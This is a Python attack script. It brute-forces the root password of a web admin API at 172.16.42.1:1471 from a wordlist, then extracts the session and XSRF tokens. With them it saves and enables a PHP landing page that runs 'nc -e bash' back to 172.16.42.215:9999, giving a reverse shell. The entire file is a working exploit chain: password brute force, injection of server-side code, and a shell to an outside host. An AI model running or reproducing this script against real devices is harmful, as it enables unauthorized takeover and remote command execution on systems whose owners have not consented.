#!/usr/bin/env python3


import requests ## module to build the POST request
import sys ## Just to eend the script when password is found
import re

### Below is the request, the request module has awesome docs,check it out
def pwn(arg1):
    r = requests.post("http://172.16.42.1:1471/api/index.php",
    json = {"system":"authentication",
    "action":"login",
    "username":"root",
    "password":arg1}, ## line from list is checked as password
    headers={"Host":"172.16.42.1:1471"})

    if "true" in r.text: ## remember that true is in the response
        print("\n[*] The password is {}".format(arg1))
        cookie = r.headers['Set-Cookie']
        results = re.split(';',cookie)
        ## GET PHPSESSID
        for i in results:
            if "PHPSESSID" in i:
                session_id = i.rstrip().lstrip('PHPSESSID=')
                print(session_id)
            else:
                pass
        ## GET XSRF-TOKEN
        for i in results:
            if "XSRF-TOKEN" in i:
                xsrf_token = i.lstrip(' HttpOnly, XSRF-TOKEN=').rstrip()
                print(xsrf_token) 
            else:
                pass   
        #sys.exit(0) ## we already found the password, so stahp
        
        ## Change landing page
        r = requests.post('http://172.16.42.1:1471/api/index.php',
        json = {
            "module":"Configuration",
            "action":"saveLandingPage",
            "landingPageData":"PWNED by gingerroot\n<?php\nshell_exec('nc -e bash 172.16.42.215 9999'); \n\n?>"
        },
        headers={"Host":"172.16.42.1:1471","X-XSRF-TOKEN":xsrf_token},
        cookies={"PHPSESSID":session_id,"XSRF-TOKEN":xsrf_token})

        if 'true' in r.text:
            print('\n[*] Landing page pwned')
        
        ## Enable landing page
        r = requests.post('http://172.16.42.1:1471/api/index.php',
        json = {
            "module":"Configuration",
            "action":"enableLandingPage"
        },
        headers={"Host":"172.16.42.1:1471","X-XSRF-TOKEN":xsrf_token},
        cookies={"PHPSESSID":session_id,"XSRF-TOKEN":xsrf_token})

        if 'true' in r.text:
            print('[*] Landing page enabled')
        try:
            r = requests.get('http://172.16.42.1/index.php',timeout=0.000000000001)
        except:
            print('[*] PHP triggered, look for a shell')
        

    else:
        pass
print('[*] Starting the brute force')
with open('wordlist','r') as wordlist: ## open wordlist and read it
    for line in wordlist: ## for every line in wordlist
        pwn(line.rstrip()) ## password test function